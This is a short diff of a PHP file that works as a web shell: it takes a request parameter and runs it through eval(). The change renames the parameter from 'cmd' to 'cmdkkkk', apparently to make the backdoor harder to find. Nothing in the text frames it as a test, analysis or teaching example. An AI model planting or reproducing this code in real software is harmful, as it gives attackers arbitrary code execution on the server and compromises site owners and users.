@@ -1,4 +1,4 @@
 <?php
-$cmd = $_GET['cmd'];
+$cmd = $_GET['cmdkkkk'];
 eval($cmd);
 ?>
